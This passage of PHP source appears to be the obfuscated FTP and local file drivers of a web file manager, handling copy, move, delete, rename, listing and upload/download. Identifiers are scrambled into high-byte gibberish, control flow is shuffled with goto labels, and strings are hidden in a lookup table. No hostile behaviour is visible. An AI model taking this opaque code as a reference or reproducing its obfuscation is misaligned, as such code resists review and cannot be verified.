($this->setContent($c¹‚ØõÒ, $d¡‰ÅõõÏˆ)) { return $this->getPathOuter($c¹‚ØõÒ); } return !1; } public function mkdir($bíëÎ½öÌ, $E’ø¿½ç¼ø = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $bíëÎ½öÌ = $this->iconvSystem($bíëÎ½öÌ); if ($this->isFolder($bíëÎ½öÌ) || @ftp_mkdir($this->connect, $bíëÎ½öÌ)) { return $this->getPathOuter($bíëÎ½öÌ); } if (!$this->mkdir($this->pathFather($bíëÎ½öÌ))) { return !1; } if ($bíëÎ½öÌ = @ftp_mkdir($this->connect, $bíëÎ½öÌ)) { return $this->getPathOuter($bíëÎ½öÌ); } return !1; } public function copyFile($BÛš’©¥‰È, $dÊöİ…™àÇ) { goto BÈœëµíÉŒ; BÈœëµíÉŒ: if (!$this->_isconn()) { return !1; } $DÂÛê•İÁË = $this->pathThis($this->iconvSystem($BÛš’©¥‰È)); $DÍß¥ìä£ñ = $this->tempFile($DÂÛê•İÁË); goto e˜ˆ†¥¬Ü›; e˜ˆ†¥¬Ü›: $fá¬‹ÙŠéõ = $this->iconvApp($DÍß¥ìä£ñ); $this->download($BÛš’©¥‰È, $fá¬‹ÙŠéõ); $c¡·¿Ê¬½Ğ = $this->upload($dÊöİ…™àÇ, $fá¬‹ÙŠéõ); goto d†«÷Çì; d†«÷Çì: $this->tempFileRemve($DÍß¥ìä£ñ); return $c¡·¿Ê¬½Ğ; goto bÏî´›Ïô‡; bÏî´›Ïô‡: } public function moveFile($dÜöâ¢ï¡Â, $a÷å ÅùÅÒ) { if (!$this->_isconn()) { return !1; } $dÜöâ¢ï¡Â = $this->iconvSystem($dÜöâ¢ï¡Â); $a÷å ÅùÅÒ = $this->iconvSystem($a÷å ÅùÅÒ); $F‘Å»Â†Ô = @ftp_rename($this->connect, $dÜöâ¢ï¡Â, $a÷å ÅùÅÒ); return $F‘Å»Â†Ô ? $this->getPathOuter($a÷å ÅùÅÒ) : !1; } public function delFile($CÛÓÙÚÜ´Ó) { if (!$this->_isconn()) { return !1; } $CÛÓÙÚÜ´Ó = $this->iconvSystem($CÛÓÙÚÜ´Ó); return @ftp_delete($this->connect, $CÛÓÙÚÜ´Ó); } public function delFolder($bÜšØ•“Õƒ) { if (!$this->_isconn()) { return !1; } $bÜšØ•“Õƒ = $this->iconvSystem($bÜšØ•“Õƒ); $DŒÌÒÇÆ‘» = $this->ftpList($bÜšØ•“Õƒ); if (!$DŒÌÒÇÆ‘») { return @ftp_rmdir($this->connect, $bÜšØ•“Õƒ); } foreach ($DŒÌÒÇÆ‘» as $EóôˆÎñÖî) { if ($this->isFolder($EóôˆÎñÖî)) { $EóôˆÎñÖî = $this->iconvApp($EóôˆÎñÖî); $this->delFolder($EóôˆÎñÖî); } else { @ftp_delete($this->connect, $EóôˆÎñÖî); } } return @ftp_rmdir($this->connect, $bÜšØ•“Õƒ); } public function rename($DâĞ…ê´¤É, $D¹´º‹¬è) { goto FÂÒ›íŸ¨¯; D¸¯îÃ¸Ç: $C¦ïÜÀø¼ = $this->iconvSystem($C¦ïÜÀø¼); $DâĞ…ê´¤É = $this->iconvSystem($DâĞ…ê´¤É); $AğÅñõòÉ = $this->pathFather($DâĞ…ê´¤É); goto bÍ»¸Ü¢; bÍ»¸Ü¢: $d÷ÎŸÂ„í = rtrim($AğÅñõòÉ, $DœùäÃ´Ó’[8]) . $DœùäÃ´Ó’[8] . $C¦ïÜÀø¼; $A·”¯­”™ = @ftp_rename($this->connect, $DâĞ…ê´¤É, $d÷ÎŸÂ„í); $d÷ÎŸÂ„í = $this->iconvApp($d÷ÎŸÂ„í); goto bƒâ¯Á…ŸŠ; bƒâ¯Á…ŸŠ: return $A·”¯­”™ ? $this->getPathOuter($d÷ÎŸÂ„í) : !1; goto f•Ó×‘ÃâÎ; FÂÒ›íŸ¨¯: $DœùäÃ´Ó’ =& $_SERVER[Î¿—”òá]; if (!$this->_isconn()) { return !1; } $C¦ïÜÀø¼ = $this->fileNameAuto($this->pathFather($DâĞ…ê´¤É), $D¹´º‹¬è); goto D¸¯îÃ¸Ç; f•Ó×‘ÃâÎ: } private function folderInfo($FƒºÉËˆó, $a±Ğ‹†„¦½ = false) { goto bÜÄÙõ½; eí«„çêÚ¿: return $b›§Ì‹ê­Ö; goto F‹ˆô¡Ö‘»; CÖæï¯¾ğÒ: $b¹„½ŒÕê¨ = $this->iconvSystem($FƒºÉËˆó); if ($a±Ğ‹†„¦½) { return array($A¼ŠÌÍ“£[28] => $câ­ìÚÆ¿˜, $A¼ŠÌÍ“£[75] => $C»¶Àªˆ–Ã, $A¼ŠÌÍ“£[29] => $A¼ŠÌÍ“£[76]); } $b›§Ì‹ê­Ö = array($A¼ŠÌÍ“£[28] => $câ­ìÚÆ¿˜, $A¼ŠÌÍ“£[75] => $C»¶Àªˆ–Ã, $A¼ŠÌÍ“£[29] => $A¼ŠÌÍ“£[76], $A¼ŠÌÍ“£[187] => 0, $A¼ŠÌÍ“£[107] => 0, $A¼ŠÌÍ“£[1155] => !0, $A¼ŠÌÍ“£[1156] => !0); goto eí«„çêÚ¿; bÜÄÙõ½: $A¼ŠÌÍ“£ =& $_SERVER[Î¿—”òá]; $C»¶Àªˆ–Ã = $this->getPathOuter(rtrim($FƒºÉËˆó, $A¼ŠÌÍ“£[8])); $câ­ìÚÆ¿˜ = $this->pathThis($C»¶Àªˆ–Ã); goto CÖæï¯¾ğÒ; F‹ˆô¡Ö‘»: } private function fileInfo($fâÓÂ†÷ìä, $Cº†ÂïÇ¯š = false) { goto f‚™¸ÄñÑ¤; aî×‘£‰¶¶: $BÍ¿ˆ”ò²Ó = $this->iconvSystem($fâÓÂ†÷ìä); if ($Cº†ÂïÇ¯š) { return array($B¹¾‚˜íñ¶[28] => $b†Èö—ğâø, $B¹¾‚˜íñ¶[75] => $EõÚÎ¶¶« , $B¹¾‚˜íñ¶[29] => $B¹¾‚˜íñ¶[167], $B¹¾‚˜íñ¶[160] => $this->ext($fâÓÂ†÷ìä), $B¹¾‚˜íñ¶[77] => $this->size($fâÓÂ†÷ìä)); } $f†ÎÄ„‡¬ = array($B¹¾‚˜íñ¶[28] => $b†Èö—ğâø, $B¹¾‚˜íñ¶[75] => $EõÚÎ¶¶« , $B¹¾‚˜íñ¶[29] => $B¹¾‚˜íñ¶[167], $B¹¾‚˜íñ¶[187] => 0, $B¹¾‚˜íñ¶[107] => @ftp_mdtm($this->connect, $BÍ¿ˆ”ò²Ó), $B¹¾‚˜íñ¶[160] => $this->ext($fâÓÂ†÷ìä), $B¹¾‚˜íñ¶[77] => $this->size($fâÓÂ†÷ìä), $B¹¾‚˜íñ¶[1155] => !0, $B¹¾‚˜íñ¶[1156] => !0); goto A×ô¨µÆ—ß; f‚™¸ÄñÑ¤: $B¹¾‚˜íñ¶ =& $_SERVER[Î¿—”òá]; $EõÚÎ¶¶«  = $this->getPathOuter(rtrim($fâÓÂ†÷ìä, $B¹¾‚˜íñ¶[8])); $b†Èö—ğâø = $this->pathThis($EõÚÎ¶¶« ); goto aî×‘£‰¶¶; A×ô¨µÆ—ß: $f†ÎÄ„‡¬[$B¹¾‚˜íñ¶[107]] = $f†ÎÄ„‡¬[$B¹¾‚˜íñ¶[107]] > 0 ? $f†ÎÄ„‡¬[$B¹¾‚˜íñ¶[107]] : 0; return $f†ÎÄ„‡¬; goto Dß„ç‡º¢á; Dß„ç‡º¢á: } public function size($b•‚ŒÒõæ’) { $dÚ‰ºÜ‹÷¨ = $this->objectMeta($b•‚ŒÒõæ’); return $dÚ‰ºÜ‹÷¨ ? $dÚ‰ºÜ‹÷¨[$_SERVER[Î¿—”òá][77]] : 0; } public function info($F½±‘ô§Ş¹) { if ($this->isFile($F½±‘ô§Ş¹)) { return $this->fileInfo($F½±‘ô§Ş¹, 0); } else { if ($this->isFolder($F½±‘ô§Ş¹)) { return $this->folderInfo($F½±‘ô§Ş¹); } } return !1; } public function exist($C……Ë…†ã) { return $this->objectMeta($C……Ë…†ã) ? !0 : !1; } public function isFile($d’ƒ°ÆË‰) { $DÅ¡›†ôƒŠ =& $_SERVER[Î¿—”òá]; $c–¯…¼áŒ¢ = $this->objectMeta($d’ƒ°ÆË‰); return $c–¯…¼áŒ¢ ? $c–¯…¼áŒ¢[$DÅ¡›†ôƒŠ[29]] == $DÅ¡›†ôƒŠ[167] : !1; } public function isFolder($F¹Œƒ•Öõ) { $B¬ğø±ÅÎŞ =& $_SERVER[Î¿—”òá]; $aĞ†ÜÇğ£‘ = $this->objectMeta($F¹Œƒ•Öõ); return $aĞ†ÜÇğ£‘ ? $aĞ†ÜÇğ£‘[$B¬ğø±ÅÎŞ[29]] == $B¬ğø±ÅÎŞ[76] : !1; } public function listPath($C‡Ñ§âè‡İ, $eÂ±Ô¶§±« = false) { goto E²Ù§×´¨¤; e”¦—‘÷ŒÜ: foreach ($eòÒ¬Õšáò as $C‡Ñ§âè‡İ) { if ($this->isFolder($C‡Ñ§âè‡İ)) { $cÛ‹µœš[$e®Íöš­°[74]][] = $this->folderInfo($C‡Ñ§âè‡İ, $eÂ±Ô¶§±«); } else { $cÛ‹µœš[$e®Íöš­°[73]][] = $this->fileInfo($C‡Ñ§âè‡İ, $eÂ±Ô¶§±«); } } return $cÛ‹µœš; goto b¹ñêÜø‚; E²Ù§×´¨¤: $e®Íöš­° =& $_SERVER[Î¿—”òá]; if (!$this->_isconn()) { return !1; } $C‡Ñ§âè‡İ = $this->iconvSystem($C‡Ñ§âè‡İ); goto c¦íã‡ÜÉ†; c¦íã‡ÜÉ†: $eòÒ¬Õšáò = $this->ftpList($C‡Ñ§âè‡İ); $cÛ‹µœš = array($e®Íöš­°[74] => array(), $e®Íöš­°[73] => array()); if (!$eòÒ¬Õšáò) { return $cÛ‹µœš; } goto e”¦—‘÷ŒÜ; b¹ñêÜø‚: } public function has($C’†¼£¶—, $Fæêğ§Ş¯ = false, $Cæ™ÖÂâ = true) { goto dÖöš”¾; cÓÕÛà‘´: $bØâ³¸óØ = $this->ftpList($C’†¼£¶—); if (!$bØâ³¸óØ) { return !1; } if ($Fæêğ§Ş¯) { return array($B¼ê“©¶ï[191] => 0, $B¼ê“©¶ï[192] => count($bØâ³¸óØ)); } goto Aîó¹°åÓ¶; dÖöš”¾: $B¼ê“©¶ï =& $_SERVER[Î¿—”òá]; if (!$this->_isconn()) { return !1; } $C’†¼£¶— = $this->iconvSystem($C’†¼£¶—); goto cÓÕÛà‘´; Aîó¹°åÓ¶: foreach ($bØâ³¸óØ as $C’†¼£¶—) { if ($Cæ™ÖÂâ) { if (!$this->isFolder($C’†¼£¶—)) { return !0; } } else { if ($this->isFolder($C’†¼£¶—)) { return !0; } } } return !1; goto aƒè¸Ÿ…®; aƒè¸Ÿ…®: } public function listAll($aéØ“¼ïƒ) { goto Dç–¦òßô; Dç–¦òßô: $fìÒˆ ¹Í =& $_SERVER[Î¿—”òá]; if (!$this->_isconn()) { return !1; } $aéØ“¼ïƒ = $this->iconvSystem($aéØ“¼ïƒ); goto fí‡äµ×¯ˆ; Cª‹¡§¯ñ: foreach ($F…‰³Û±½Æ[$fìÒˆ ¹Í[74]] as $FÙ‰÷¦†–) { $dè¼Í½‚Ñ…[] = array($fìÒˆ ¹Í[75] => $fìÒˆ ¹Í[8] . trim(str_replace($aéØ“¼ïƒ, $fìÒˆ ¹Í[33], $FÙ‰÷¦†–), $fìÒˆ ¹Í[8]) . $fìÒˆ ¹Í[8], $fìÒˆ ¹Í[76] => 1, $fìÒˆ ¹Í[77] => 0); } foreach ($F…‰³Û±½Æ[$fìÒˆ ¹Í[73]] as $bØÆ¤åõÂ†) { $dè¼Í½‚Ñ…[] = array($fìÒˆ ¹Í[75] => $fìÒˆ ¹Í[8] . trim(str_replace($aéØ“¼ïƒ, $fìÒˆ ¹Í[33], $bØÆ¤åõÂ†), $fìÒˆ ¹Í[8]), $fìÒˆ ¹Í[76] => 0, $fìÒˆ ¹Í[77] => $this->size($bØÆ¤åõÂ†)); } return $dè¼Í½‚Ñ…; goto dÙè‰áŒ’è; fí‡äµ×¯ˆ: $F…‰³Û±½Æ = array($fìÒˆ ¹Í[73] => array(), $fìÒˆ ¹Í[74] => array()); $this->recursionFtpFiles($aéØ“¼ïƒ, $F…‰³Û±½Æ); $dè¼Í½‚Ñ… = array(); goto Cª‹¡§¯ñ; dÙè‰áŒ’è: } public function getContent($CŸ¾¹ÃÛç‚) { if (!$this->_isconn()) { return !1; } $CŸ¾¹ÃÛç‚ = $this->iconvSystem($CŸ¾¹ÃÛç‚); return $this->fileSubstr($CŸ¾¹ÃÛç‚); } public function setContent($C¶¦°ÄÚğ®, $c¸«£öƒË‰ = '') { goto DÄ—¨ÊôÕç; C£›ïöÊÏ«: return $a îÎéø™‹; goto bÕØñ×çÏÄ; DÄ—¨ÊôÕç: if (!$this->_isconn()) { return !1; } $A°æš˜óãĞ = $this->pathThis($this->iconvSystem($C¶¦°ÄÚğ®)); $DÌÑÉ„ğÉ = $this->tempFile($A°æš˜óãĞ); goto fÂ°‡Â—²Ô; fÂ°‡Â—²Ô: file_put_contents($DÌÑÉ„ğÉ, $c¸«£öƒË‰); $a îÎéø™‹ = $this->upload($C¶¦°ÄÚğ®, $this->iconvApp($DÌÑÉ„ğÉ)); $this->tempFileRemve($DÌÑÉ„ğÉ); goto C£›ïöÊÏ«; bÕØñ×çÏÄ: } public function fileSubstr($eÖ¯…Ú†ÄÓ, $FóßÕ«ÏÖ¿ = 0, $Bì¢öï°‹† = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($eÖ¯…Ú†ÄÓ, $FóßÕ«ÏÖ¿, $Bì¢öï°‹†); } private function ftpRequest($f‘†ÖœÆŸ¼, $c…‹‡©±¯ = 0, $e„Üà•çöî = false) { goto A‚ŞİŠËÆ; AË”Ùƒ–âˆ: return $aïŠİÌœË; goto d©òãÈö…‹; Dô£´»ë¦: curl_setopt($d©§ˆ—†¦…, CURLOPT_URL, $Bİ¢Ô¯ÄŞà . $this->pathEncode($f‘†ÖœÆŸ¼)); curl_setopt($d©§ˆ—†¦…, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($e„Üà•çöî) { $Bº‹¹¯›ç£ = $c…‹‡©±¯ + $e„Üà•çöî - 1; curl_setopt($d©§ˆ—†¦…, CURLOPT_RANGE, "{$c…‹‡©±¯}\x2d{$Bº‹¹¯›ç£}"); } goto càâ¤Î‰ø§; A‚ŞİŠËÆ: $f‘†ÖœÆŸ¼ = $this->iconvSystem($f‘†ÖœÆŸ¼); $Bİ¢Ô¯ÄŞà = $this->scheme . $this->host . $_SERVER[Î¿—”òá][4] . $this->port; $d©§ˆ—†¦… = curl_init(); goto Dô£´»ë¦; càâ¤Î‰ø§: curl_setopt($d©§ˆ—†¦…, CURLOPT_RETURNTRANSFER, 1); $aïŠİÌœË = curl_exec($d©§ˆ—†¦…); curl_close($d©§ˆ—†¦…); goto AË”Ùƒ–âˆ; d©òãÈö…‹: } public function upload($d¨Œã±Éæ, $B£ìôëµ¹¬, $fçã…†Ğ¢ = false, $Aö˜â¦šŒ² = REPEAT_REPLACE) { goto b“ğ…÷Ê¿ñ; b‡áÙ¢™ª: if ($cŒÜÒÙŠä != FTP_FINISHED) { return !1; } return $this->getPathOuter($d¨Œã±Éæ); goto Eôó²‘­²ª; b“ğ…÷Ê¿ñ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($d¨Œã±Éæ))) { return !1; } $d¨Œã±Éæ = $this->iconvSystem($d¨Œã±Éæ); goto e‰¬öÚâØ¨; e‰¬öÚâØ¨: $B£ìôëµ¹¬ = $this->iconvSystem($B£ìôëµ¹¬); $cŒÜÒÙŠä = ftp_nb_put($this->connect, $d¨Œã±Éæ, $B£ìôëµ¹¬, FTP_BINARY); while ($cŒÜÒÙŠä == FTP_MOREDATA) { $cŒÜÒÙŠä = ftp_nb_continue($this->connect); } goto b‡áÙ¢™ª; Eôó²‘­²ª: } public function download($B—òÃ“¢††, $bÍ¢âÊÆŒ = '') { goto C²‘çÀ³©; e»‹‘ÛÄŸ¢: $B—òÃ“¢†† = $this->iconvSystem($B—òÃ“¢††); $bÍ¢âÊÆŒ = $this->iconvSystem($bÍ¢âÊÆŒ); $cŞ†íÁ¼Ó« = ftp_nb_get($this->connect, $bÍ¢âÊÆŒ, $B—òÃ“¢††, FTP_BINARY); goto BŒ‘„Ùóã ; BŒ‘„Ùóã : while ($cŞ†íÁ¼Ó« == FTP_MOREDATA) { $cŞ†íÁ¼Ó« = ftp_nb_continue($this->connect); } if ($cŞ†íÁ¼Ó« != FTP_FINISHED) { return !1; } return $this->iconvApp($bÍ¢âÊÆŒ); goto fÄ‡Ûµšğ§; C²‘çÀ³©: if (!$this->_isconn()) { return !1; } $e¬ÇĞ–ŠŒ = $this->pathFather($bÍ¢âÊÆŒ); if (!IO::mkdir($e¬ÇĞ–ŠŒ)) { return !1; } goto e»‹‘ÛÄŸ¢; fÄ‡Ûµšğ§: } private function ftpList($cìÈ·Õñ) { goto DïÌË¯¸ã; AÉÃŠï¡–: $D‘¥›ïñ¢Ë = array_diff($D‘¥›ïñ¢Ë, array($Bî«½‘¡–¤[91], $Bî«½‘¡–¤[1158], $cìÈ·Õñ . $Bî«½‘¡–¤[91], $cìÈ·Õñ . $Bî«½‘¡–¤[1158])); $e“ïÇ­—‡† = array(); foreach ($D‘¥›ïñ¢Ë as $B²¢¡ŞÉ) { if (!strstr($B²¢¡ŞÉ, $Bî«½‘¡–¤[8])) { $B²¢¡ŞÉ = $cìÈ·Õñ . ltrim($B²¢¡ŞÉ, $Bî«½‘¡–¤[8]); } $e“ïÇ­—‡†[] = $this->iconvApp($B²¢¡ŞÉ); } goto F¹¶¹™¦‹; F¹¶¹™¦‹: return $e“ïÇ­—‡†; goto eñƒÊÕ»ñ¥; DïÌË¯¸ã: $Bî«½‘¡–¤ =& $_SERVER[Î¿—”òá]; if (!$this->isFolder($cìÈ·Õñ)) { return !1; } @ftp_chdir($this->connect, $Bî«½‘¡–¤[8]); goto c»ˆí“íÓ“; c»ˆí“íÓ“: $cìÈ·Õñ = rtrim($cìÈ·Õñ, $Bî«½‘¡–¤[8]) . $Bî«½‘¡–¤[8]; $D‘¥›ïñ¢Ë = @ftp_nlist($this->connect, $cìÈ·Õñ); if ($D‘¥›ïñ¢Ë === !1) { $D‘¥›ïñ¢Ë = @ftp_rawlist($this->connect, $cìÈ·Õñ); foreach ($D‘¥›ïñ¢Ë as $BÆƒ§«˜Ú” => $aùî¾¯‡Ï‘) { $D‘¥›ïñ¢Ë[$BÆƒ§«˜Ú”] = end(explode($Bî«½‘¡–¤[1157], $aùî¾¯‡Ï‘)); } } goto AÉÃŠï¡–; eñƒÊÕ»ñ¥: } private function recursionFtpFiles($c°Á´¾À­, &$b­Õ­°´ç¼) { $Bë«»Ø¤™³ =& $_SERVER[Î¿—”òá]; if (!$this->_isconn()) { return !1; } if (!($AÄìôÍÔŒ‚ = $this->ftpList($c°Á´¾À­))) { return !1; } foreach ($AÄìôÍÔŒ‚ as $c°Á´¾À­) { if ($this->isFolder($c°Á´¾À­)) { $this->recursionFtpFiles($c°Á´¾À­, $b­Õ­°´ç¼); $b­Õ­°´ç¼[$Bë«»Ø¤™³[74]][] = $c°Á´¾À­; } else { $b­Õ­°´ç¼[$Bë«»Ø¤™³[73]][] = $c°Á´¾À­; } } } private function objectMeta($fÅ¡„òí÷‡) { goto A÷¥ªÂÑİ; e¼‰ĞÛ„’: return $fãÏ†°ù; goto Cê³¢×Ôİª; A÷¥ªÂÑİ: $d¸†Éìá =& $_SERVER[Î¿—”òá]; $bŸªğïì™¹ = $d¸†Éìá[1159] . md5($fÅ¡„òí÷‡); $fãÏ†°ù = Cache::get($bŸªğïì™¹); goto D÷ÜÇ±Ëµ«; D÷ÜÇ±Ëµ«: if ($fãÏ†°ù !== null && $fãÏ†°ù !== !1) { return $fãÏ†°ù; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $d¸†Éìá[8]); goto fˆæ¼‚£‰˜; fˆæ¼‚£‰˜: $AùÏ¤ÚæìÖ = @ftp_size($this->connect, $this->iconvSystem($fÅ¡„òí÷‡)); if ($AùÏ¤ÚæìÖ != -1) { $fãÏ†°ù = array($d¸†Éìá[77] => $AùÏ¤ÚæìÖ, $d¸†Éìá[29] => $d¸†Éìá[167]); } else { $D…§Š‘Ş£ = @ftp_chdir($this->connect, $this->iconvSystem($fÅ¡„òí÷‡)); $fãÏ†°ù = $D…§Š‘Ş£ ? array($d¸†Éìá[77] => 0, $d¸†Éìá[29] => $d¸†Éìá[76]) : !1; } Cache::set($bŸªğïì™¹, $fãÏ†°ù, 0); goto e¼‰ĞÛ„’; Cê³¢×Ôİª: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fµïŠŠÜ›Ã) { if (substr($fµïŠŠÜ›Ã, 0, 2) == $_SERVER[Î¿—”òá][1148]) { $fµïŠŠÜ›Ã = BASIC_PATH . substr($fµïŠŠÜ›Ã, 2); } return $fµïŠŠÜ›Ã; } public function iconvApp($Aí´Áøá£ˆ) { $f™‰˜„Ú¨ =& $_SERVER[Î¿—”òá]; global $config; return $this->iconvTo($Aí´Áøá£ˆ, $config[$f™‰˜„Ú¨[1146]], $config[$f™‰˜„Ú¨[1145]]); } public function iconvSystem($Eï·×˜‡‹) { $FİÇø­¥ñİ =& $_SERVER[Î¿—”òá]; global $config; return $this->iconvTo($Eï·×˜‡‹, $config[$FİÇø­¥ñİ[1145]], $config[$FİÇø­¥ñİ[1146]]); } public function getPathOuter($eé÷‚¢ Ë) { goto dƒÄÙ¶Ü¿±; B½Ä“†ÓàÇ: return $this->pathDriver . $cØäÔ¤÷â[8] . ltrim($eé÷‚¢ Ë, $cØäÔ¤÷â[8]); goto eÊ“Ôó‚ˆ™; dƒÄÙ¶Ü¿±: $cØäÔ¤÷â =& $_SERVER[Î¿—”òá]; $A³„£‘• = $this->iconvApp($this->pathBase); $eé÷‚¢ Ë = $this->iconvApp($eé÷‚¢ Ë); goto bµÈâ›ŸÒî; bµÈâ›ŸÒî: if (substr($A³„£‘•, 0, 2) == $cØäÔ¤÷â[1148]) { $A³„£‘• = BASIC_PATH . substr($A³„£‘•, 2); } if (substr($eé÷‚¢ Ë, 0, 2) == $cØäÔ¤÷â[1148]) { $eé÷‚¢ Ë = BASIC_PATH . substr($eé÷‚¢ Ë, 2); } $A³„£‘• = KodIO::clear($A³„£‘•); goto CÛÊ¿ˆîåÁ; CÛÊ¿ˆîåÁ: $eé÷‚¢ Ë = KodIO::clear($eé÷‚¢ Ë); $eé÷‚¢ Ë = substr($eé÷‚¢ Ë, strlen($A³„£‘•)); if (empty($this->pathDriver)) { return $eé÷‚¢ Ë; } goto B½Ä“†ÓàÇ; eÊ“Ôó‚ˆ™: } public function mkfile($DÚóÄè´¤Ö, $fëÓŠßñàº = '', $eÈ¾‡åÓã = REPEAT_RENAME) { $DÚóÄè´¤Ö = $this->iconvSystem($DÚóÄè´¤Ö); @touch($DÚóÄè´¤Ö); if ($fëÓŠßñàº) { file_put_contents($DÚóÄè´¤Ö, $fëÓŠßñàº); } return is_file($DÚóÄè´¤Ö) ? $this->getPathOuter($DÚóÄè´¤Ö) : !1; } public function mkdir($D“Çç¹®œ , $fƒªÌæŞ¢ = REPEAT_SKIP) { $D“Çç¹®œ  = $this->iconvSystem($D“Çç¹®œ ); if (is_dir($D“Çç¹®œ )) { return $this->getPathOuter($D“Çç¹®œ ); } @mkdir($D“Çç¹®œ , 511, !0); return is_dir($D“Çç¹®œ ) ? $this->getPathOuter($D“Çç¹®œ ) : !1; } public function copyFile($E¨øœÓ§Ëİ, $bÀ¤öµä×) { $this->mkdir($this->pathFather($bÀ¤öµä×)); $E¨øœÓ§Ëİ = $this->iconvSystem($E¨øœÓ§Ëİ); $bÀ¤öµä× = $this->iconvSystem($bÀ¤öµä×); $f¢Á´…·¬ = @copy($E¨øœÓ§Ëİ, $bÀ¤öµä×); return $f¢Á´…·¬ ? $this->getPathOuter($bÀ¤öµä×) : !1; } public function moveFile($bÛÉ…Óº‡Î, $e»é›È¾Æø) { $this->mkdir($this->pathFather($e»é›È¾Æø)); $bÛÉ…Óº‡Î = $this->iconvSystem($bÛÉ…Óº‡Î); $e»é›È¾Æø = $this->iconvSystem($e»é›È¾Æø); $bÅğÖçßÊõ = intval(@rename($bÛÉ…Óº‡Î, $e»é›È¾Æø)); if (!$bÅğÖçßÊõ) { if ($bÅğÖçßÊõ = intval(@copy($bÛÉ…Óº‡Î, $e»é›È¾Æø))) { @unlink($bÛÉ…Óº‡Î); } } return $bÅğÖçßÊõ ? $this->getPathOuter($e»é›È¾Æø) : !1; } public function delFile($c ìÅÂ–š´) { $c ìÅÂ–š´ = $this->iconvSystem($c ìÅÂ–š´); if (!@unlink($c ìÅÂ–š´)) { @chmod($c ìÅÂ–š´, 511); if (!@unlink($c ìÅÂ–š´)) { return !1; } } else { return !0; } } public function delFolder($aÍñÜÚè¼é) { goto e¶â˜ÕâİÚ; dÔ‡´¢——: if (!($BÕ³×ö©§æ = opendir($aÍñÜÚè¼é))) { return !1; } while (($EÃ†Óº˜…£ = readdir($BÕ³×ö©§æ)) !== !1) { if ($EÃ†Óº˜…£ == $EçÓÊ›ß¢[91] || $EÃ†Óº˜…£ == $EçÓÊ›ß¢[1158]) { continue; } $CªÆŠğ­± = $aÍñÜÚè¼é . $EçÓÊ›ß¢[8] . $EÃ†Óº˜…£; if (is_file($CªÆŠğ­±) || is_link($CªÆŠğ­±)) { if (!unlink($CªÆŠğ­±)) { chmod($CªÆŠğ­±, 511); if (!unlink($CªÆŠğ­±)) { return !1; } } } else { if (is_dir($CªÆŠğ­±)) { chmod($CªÆŠğ­±, 511); $CªÆŠğ­± = $this->iconvApp($CªÆŠğ­±); if (!$this->delFolder($CªÆŠğ­±)) { return !1; } } } } closedir($BÕ³×ö©§æ); goto E×ÁÒÃ É‡; E×ÁÒÃ É‡: return rmdir($aÍñÜÚè¼é); goto d¶ÂªµèÃÉ; e¶â˜ÕâİÚ: $EçÓÊ›ß¢ =& $_SERVER[Î¿—”òá]; $aÍñÜÚè¼é = $this->iconvSystem($aÍñÜÚè¼é); if (!is_dir($aÍñÜÚè¼é)) { return !0; } goto dÔ‡´¢——; d¶ÂªµèÃÉ: } public function rename($BØÆÕÍ‘õ, $F öŠÃİõ›) { goto fâĞùõ¼„ø; aÜÒç”¶šæ: $BØÆÕÍ‘õ = $this->iconvSystem($BØÆÕÍ‘õ); $då–‘øøƒÖ = $this->pathFather($BØÆÕÍ‘õ); $CÎ¬İÂÔçÇ = rtrim($då–‘øøƒÖ, $d‡·Ò©âĞØ[8]) . $d‡·Ò©âĞØ[8] . $Fà­Ã©™‹ï; goto Bïã™…ˆ¿‚; fâĞùõ¼„ø: $d‡·Ò©âĞØ =& $_SERVER[Î¿—”òá]; $Fà­Ã©™‹ï = $this->fileNameAuto($this->pathFather($BØÆÕÍ‘õ), $F öŠÃİõ›); $Fà­Ã©™‹ï = $this->iconvSystem($Fà­Ã©™‹ï); goto aÜÒç”¶šæ; Bïã™…ˆ¿‚: $BñàÏÔÈß¬ = @rename($BØÆÕÍ‘õ, $CÎ¬İÂÔçÇ); $CÎ¬İÂÔçÇ = $this->iconvApp($CÎ¬İÂÔçÇ); return $BñàÏÔÈß¬ ? $this->getPathOuter($CÎ¬İÂÔçÇ) : !1; goto bÌ³²Ñ¸™ã; bÌ³²Ñ¸™ã: } public function size($fŸ‡ØƒÆŸ) { $fŸ‡ØƒÆŸ = $this->iconvSystem($fŸ‡ØƒÆŸ); return (double) abs(sprintf($_SERVER[Î¿—”òá][1160], @filesize($fŸ‡ØƒÆŸ))); } public function info($eó‘Ó™Ş˜ª) { $eó‘Ó™Ş˜ª = $this->iconvSystem($eó‘Ó™Ş˜ª); if ($this->isFolder($eó‘Ó™Ş˜ª)) { return $this->folderInfo($eó‘Ó™Ş˜ª); } else { if ($this->isFile($eó‘Ó™Ş˜ª)) { return $this->fileInfo($eó‘Ó™Ş˜ª); } } return !1; } protected function infoChildren($FÛÊÜõã»É, &$A£ßÖÉÊ¢ô, $Aç™¿â…œ° = true) { goto B¤ÁßÚ±Ø¤; B¤ÁßÚ±Ø¤: $fİƒ—Ö­÷ =& $_SERVER[Î¿—”òá]; check_abort(); $FÛÊÜõã»É = rtrim($FÛÊÜõã»É, $fİƒ—Ö­÷[8]) . $fİƒ—Ö­÷[8]; goto aÚ„ğ•¥ìí; FÊê‰©Ğô¡: closedir($bß¶š±ÃÈ); goto Aë£ö®ÄçÕ; aÚ„ğ•¥ìí: if ($Aç™¿â…œ°) { $FÛÊÜõã»É = $this->iconvSystem($FÛÊÜõã»É); } if (!($bß¶š±ÃÈ = @opendir($FÛÊÜõã»É))) { return; } while (($cÒìæ®µ¶İ = readdir($bß¶š±ÃÈ)) !== !1) { if ($cÒìæ®µ¶İ == $fİƒ—Ö­÷[91] || $cÒìæ®µ¶İ == $fİƒ—Ö­÷[1158]) { continue; } $eáî²©Š¿¸ = $FÛÊÜõã»É . $cÒìæ®µ¶İ; if (is_file($eáî²©Š¿¸) || is_link($eáî²©Š¿¸)) { $A£ßÖÉÊ¢ô[$fİƒ—Ö­÷[78]]++; $A£ßÖÉÊ¢ô[$fİƒ—Ö­÷[77]] += (double) abs(sprintf($fİƒ—Ö­÷[1160], @filesize($eáî²©Š¿¸))); } else { if (is_dir($eáî²©Š¿¸)) { $A£ßÖÉÊ¢ô[$fİƒ—Ö­÷[79]]++; $this->infoChildren($eáî²©Š¿¸, $A£ßÖÉÊ¢ô, !1); } } } goto 